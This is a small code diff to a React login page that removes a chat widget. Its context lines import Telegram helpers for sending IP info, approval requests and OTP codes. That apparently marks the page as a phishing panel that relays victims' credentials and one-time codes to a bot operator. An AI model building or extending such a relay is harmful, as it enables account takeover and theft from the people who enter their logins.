@@ -3,7 +3,6 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown } from "lucide-react";
-import { ChatWidget } from "@/components/chat-widget";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
 import { LoadingModal } from "@/components/loading-modal";
 import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset, sendBotOTP, sendOtpVerificationRequest } from "@/lib/telegram";
@@ -641,7 +640,6 @@ export default function Login() {
       </div>
 
       <RecaptchaBadge />
-      <ChatWidget />
 
       {/* Loading overlay — hanya muncul saat tidak ada modal lain */}
       <LoadingModal show={(loading || waiting) && !showVerifyModal && !showCodeModal && !showModal} />
